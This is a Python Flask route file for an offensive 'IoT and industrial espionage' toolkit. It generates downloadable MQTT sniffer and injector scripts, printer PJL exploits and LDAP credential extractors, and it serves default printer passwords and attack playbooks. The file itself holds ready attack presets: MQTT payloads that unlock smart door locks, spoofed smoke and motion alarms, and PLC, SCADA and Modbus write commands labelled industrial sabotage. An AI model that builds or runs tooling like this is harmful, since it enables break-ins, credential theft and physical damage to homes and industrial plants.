"""
IoT & Industrial (OT) Espionage - Flask API Routes
==================================================

MQTT Sniffer & Injector + Printer Memory Dump API endpoints

Author: CyberPulse
"""

import os
import json
from datetime import datetime
from flask import Blueprint, render_template, request, jsonify, Response
from typing import Dict, Any, List

# Import core module
import sys
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..', 'tools'))

try:
    from iot_ot_espionage import (
        IoTOTEspionage,
        MQTTSniffer,
        PrinterExploiter,
        IoTDeviceType,
        PrinterVendor,
        PrinterExploitType
    )
except ImportError as e:
    print(f"[IMPORT ERROR] iot_ot_espionage: {e}")
    IoTOTEspionage = None
    MQTTSniffer = None
    PrinterExploiter = None


# Create Blueprint
iot_bp = Blueprint(
    'iot_ot',
    __name__,
    url_prefix='/iot-espionage'
)

# Initialize
iot_espionage = IoTOTEspionage() if IoTOTEspionage else None


# ============ PAGE ROUTES ============

@iot_bp.route('/')
def index():
    """Ana sayfa"""
    return render_template('iot_ot_espionage.html')


# ============ MQTT API ============

@iot_bp.route('/api/mqtt/topics')
def get_mqtt_topics():
    """Yaygın MQTT topic'lerini getir"""
    if not iot_espionage:
        return jsonify({"success": False, "error": "Module not loaded"}), 500
    
    topics = []
    for topic_key, topic_obj in iot_espionage.mqtt_sniffer.common_topics.items():
        topics.append({
            "pattern": topic_key,
            "device_type": topic_obj.device_type.value,
            "description": topic_obj.description,
            "payload_format": topic_obj.payload_format,
            "attacks": topic_obj.attack_payloads
        })
    
    return jsonify({
        "success": True,
        "topics": topics
    })


@iot_bp.route('/api/mqtt/device-fingerprints')
def get_device_fingerprints():
    """IoT cihaz parmak izlerini getir"""
    if not iot_espionage:
        return jsonify({"success": False, "error": "Module not loaded"}), 500
    
    return jsonify({
        "success": True,
        "fingerprints": iot_espionage.mqtt_sniffer.device_fingerprints
    })


@iot_bp.route('/api/mqtt/sniffer/generate', methods=['POST'])
def generate_mqtt_sniffer():
    """MQTT Sniffer script'i oluştur"""
    if not iot_espionage:
        return jsonify({"success": False, "error": "Module not loaded"}), 500
    
    data = request.get_json() or {}
    
    broker = data.get('broker', 'localhost')
    port = data.get('port', 1883)
    topics = data.get('topics', ['#'])
    output_file = data.get('output_file', 'mqtt_capture.json')
    
    result = iot_espionage.mqtt_sniffer.generate_sniffer_script(
        broker=broker,
        port=port,
        topics=topics,
        output_file=output_file
    )
    
    return jsonify({
        "success": True,
        "result": result
    })


@iot_bp.route('/api/mqtt/injector/generate', methods=['POST'])
def generate_mqtt_injector():
    """MQTT Injector script'i oluştur"""
    if not iot_espionage:
        return jsonify({"success": False, "error": "Module not loaded"}), 500
    
    data = request.get_json() or {}
    
    broker = data.get('broker', 'localhost')
    port = data.get('port', 1883)
    target_topic = data.get('target_topic')
    payloads = data.get('payloads')
    
    result = iot_espionage.mqtt_sniffer.generate_injector_script(
        broker=broker,
        port=port,
        target_topic=target_topic,
        payloads=payloads
    )
    
    return jsonify({
        "success": True,
        "result": result
    })


@iot_bp.route('/api/mqtt/discovery/generate', methods=['POST'])
def generate_mqtt_discovery():
    """MQTT/IoT keşif script'i oluştur"""
    if not iot_espionage:
        return jsonify({"success": False, "error": "Module not loaded"}), 500
    
    data = request.get_json() or {}
    network = data.get('network', '192.168.1.0/24')
    
    result = iot_espionage.mqtt_sniffer.generate_discovery_script(network=network)
    
    return jsonify({
        "success": True,
        "result": result
    })


@iot_bp.route('/api/mqtt/playbook/<device_type>')
def get_mqtt_playbook(device_type: str):
    """Cihaz tipine göre saldırı playbook'u"""
    if not iot_espionage:
        return jsonify({"success": False, "error": "Module not loaded"}), 500
    
    try:
        device = IoTDeviceType(device_type)
    except ValueError:
        return jsonify({"success": False, "error": f"Invalid device type: {device_type}"}), 400
    
    playbook = iot_espionage.mqtt_sniffer.get_attack_playbook(device)
    
    return jsonify({
        "success": True,
        "playbook": playbook
    })


@iot_bp.route('/api/mqtt/device-types')
def get_device_types():
    """IoT cihaz tiplerini getir"""
    return jsonify({
        "success": True,
        "device_types": [
            {"value": dt.value, "name": dt.name.replace("_", " ").title()}
            for dt in IoTDeviceType
        ] if IoTDeviceType else []
    })


# ============ PRINTER API ============

@iot_bp.route('/api/printer/vendors')
def get_printer_vendors():
    """Yazıcı üreticilerini getir"""
    return jsonify({
        "success": True,
        "vendors": [
            {"value": v.value, "name": v.name.replace("_", " ").title()}
            for v in PrinterVendor
        ] if PrinterVendor else []
    })


@iot_bp.route('/api/printer/default-creds')
def get_default_credentials():
    """Varsayılan yazıcı şifrelerini getir"""
    if not iot_espionage:
        return jsonify({"success": False, "error": "Module not loaded"}), 500
    
    return jsonify({
        "success": True,
        "credentials": iot_espionage.printer_exploiter.default_credentials
    })


@iot_bp.route('/api/printer/exploits')
def get_printer_exploits():
    """Yazıcı exploit'lerini getir"""
    if not iot_espionage:
        return jsonify({"success": False, "error": "Module not loaded"}), 500
    
    return jsonify({
        "success": True,
        "exploits": iot_espionage.printer_exploiter.exploits
    })


@iot_bp.route('/api/printer/pjl/generate', methods=['POST'])
def generate_pjl_exploit():
    """PJL exploit script'i oluştur"""
    if not iot_espionage:
        return jsonify({"success": False, "error": "Module not loaded"}), 500
    
    data = request.get_json() or {}
    
    target_ip = data.get('target_ip', '192.168.1.50')
    port = data.get('port', 9100)
    
    result = iot_espionage.printer_exploiter.generate_pjl_exploit_script(
        target_ip=target_ip,
        port=port
    )
    
    return jsonify({
        "success": True,
        "result": result
    })


@iot_bp.route('/api/printer/ldap/generate', methods=['POST'])
def generate_ldap_extractor():
    """LDAP extractor script'i oluştur"""
    if not iot_espionage:
        return jsonify({"success": False, "error": "Module not loaded"}), 500
    
    data = request.get_json() or {}
    
    target_ip = data.get('target_ip', '192.168.1.50')
    vendor = data.get('vendor', 'hp')
    
    try:
        vendor_enum = PrinterVendor(vendor)
    except ValueError:
        vendor_enum = PrinterVendor.HP
    
    result = iot_espionage.printer_exploiter.generate_ldap_extractor_script(
        target_ip=target_ip,
        vendor=vendor_enum
    )
    
    return jsonify({
        "success": True,
        "result": result
    })


@iot_bp.route('/api/printer/scanner/generate', methods=['POST'])
def generate_printer_scanner():
    """Printer scanner script'i oluştur"""
    if not iot_espionage:
        return jsonify({"success": False, "error": "Module not loaded"}), 500
    
    data = request.get_json() or {}
    network = data.get('network', '192.168.1.0/24')
    
    result = iot_espionage.printer_exploiter.generate_printer_scanner_script(network=network)
    
    return jsonify({
        "success": True,
        "result": result
    })


@iot_bp.route('/api/printer/lateral-movement')
def get_lateral_movement_guide():
    """Printer lateral movement rehberini getir"""
    if not iot_espionage:
        return jsonify({"success": False, "error": "Module not loaded"}), 500
    
    guide = iot_espionage.printer_exploiter.get_lateral_movement_guide()
    
    return jsonify({
        "success": True,
        "guide": guide
    })


# ============ DOWNLOAD ROUTES ============

@iot_bp.route('/api/download/mqtt-sniffer', methods=['POST'])
def download_mqtt_sniffer():
    """MQTT Sniffer script'ini indir"""
    if not iot_espionage:
        return "Module not loaded", 500
    
    data = request.get_json() or {}
    
    result = iot_espionage.mqtt_sniffer.generate_sniffer_script(
        broker=data.get('broker', 'localhost'),
        port=data.get('port', 1883),
        topics=data.get('topics', ['#'])
    )
    
    return Response(
        result['script'],
        mimetype='text/x-python',
        headers={
            'Content-Disposition': 'attachment; filename=mqtt_sniffer.py'
        }
    )


@iot_bp.route('/api/download/mqtt-injector', methods=['POST'])
def download_mqtt_injector():
    """MQTT Injector script'ini indir"""
    if not iot_espionage:
        return "Module not loaded", 500
    
    data = request.get_json() or {}
    
    result = iot_espionage.mqtt_sniffer.generate_injector_script(
        broker=data.get('broker', 'localhost'),
        port=data.get('port', 1883),
        payloads=data.get('payloads')
    )
    
    return Response(
        result['script'],
        mimetype='text/x-python',
        headers={
            'Content-Disposition': 'attachment; filename=mqtt_injector.py'
        }
    )


@iot_bp.route('/api/download/pjl-exploit', methods=['POST'])
def download_pjl_exploit():
    """PJL exploit script'ini indir"""
    if not iot_espionage:
        return "Module not loaded", 500
    
    data = request.get_json() or {}
    
    result = iot_espionage.printer_exploiter.generate_pjl_exploit_script(
        target_ip=data.get('target_ip', '192.168.1.50'),
        port=data.get('port', 9100)
    )
    
    return Response(
        result['script'],
        mimetype='text/x-python',
        headers={
            'Content-Disposition': 'attachment; filename=pjl_exploit.py'
        }
    )


@iot_bp.route('/api/download/ldap-extractor', methods=['POST'])
def download_ldap_extractor():
    """LDAP extractor script'ini indir"""
    if not iot_espionage:
        return "Module not loaded", 500
    
    data = request.get_json() or {}
    
    vendor = data.get('vendor', 'hp')
    try:
        vendor_enum = PrinterVendor(vendor)
    except:
        vendor_enum = PrinterVendor.HP
    
    result = iot_espionage.printer_exploiter.generate_ldap_extractor_script(
        target_ip=data.get('target_ip', '192.168.1.50'),
        vendor=vendor_enum
    )
    
    return Response(
        result['script'],
        mimetype='text/x-python',
        headers={
            'Content-Disposition': 'attachment; filename=ldap_extractor.py'
        }
    )


@iot_bp.route('/api/download/printer-scanner', methods=['POST'])
def download_printer_scanner():
    """Printer scanner script'ini indir"""
    if not iot_espionage:
        return "Module not loaded", 500
    
    data = request.get_json() or {}
    
    result = iot_espionage.printer_exploiter.generate_printer_scanner_script(
        network=data.get('network', '192.168.1.0/24')
    )
    
    return Response(
        result['script'],
        mimetype='text/x-python',
        headers={
            'Content-Disposition': 'attachment; filename=printer_scanner.py'
        }
    )


# ============ MODULE INFO ============

@iot_bp.route('/api/info')
def get_module_info():
    """Modül bilgisini getir"""
    if not iot_espionage:
        return jsonify({"success": False, "error": "Module not loaded"}), 500
    
    return jsonify({
        "success": True,
        "info": iot_espionage.get_module_info()
    })


# ============ QUICK ATTACK PRESETS ============

@iot_bp.route('/api/presets/door-unlock')
def preset_door_unlock():
    """Kapı kilidi açma preset'i"""
    return jsonify({
        "success": True,
        "preset": {
            "name": "🚪 Door Unlock Attack",
            "description": "Akıllı kapı kilitlerini açmak için MQTT payloadları",
            "topics": [
                "homeassistant/lock/+/set",
                "zigbee2mqtt/+/set",
                "smartthings/lock/+/set",
                "tuya/+/lock"
            ],
            "payloads": [
                {"state": "UNLOCK"},
                {"command": "unlock"},
                {"lock": False},
                {"action": "open"}
            ]
        }
    })


@iot_bp.route('/api/presets/sensor-spoof')
def preset_sensor_spoof():
    """Sensör spoofing preset'i"""
    return jsonify({
        "success": True,
        "preset": {
            "name": "🌡️ Sensor Spoofing Attack",
            "description": "Sensör değerlerini manipüle etmek için payload'lar",
            "spoofs": [
                {"type": "temperature", "value": 100, "effect": "Alarm tetikle"},
                {"type": "humidity", "value": 99, "effect": "Nem alarmı"},
                {"type": "motion", "value": True, "effect": "Sahte hareket"},
                {"type": "smoke", "value": True, "effect": "Yangın alarmı"}
            ]
        }
    })


@iot_bp.route('/api/presets/industrial-sabotage')
def preset_industrial_sabotage():
    """Endüstriyel sabotaj preset'i"""
    return jsonify({
        "success": True,
        "preset": {
            "name": "⚙️ Industrial Sabotage",
            "description": "PLC ve SCADA sistemleri için saldırı payload'ları",
            "warning": "⚠️ Bu saldırılar GERÇEK FİZİKSEL HASAR verebilir!",
            "targets": [
                {"type": "PLC", "action": "Stop conveyor belt", "command": "D100 = 0"},
                {"type": "SCADA", "action": "Open valve", "command": "valve = open"},
                {"type": "Modbus", "action": "Write coil", "command": "coil[0] = 1"},
                {"type": "Siemens S7", "action": "DB write", "command": "DB1.DBW0 = 0"}
            ]
        }
    })
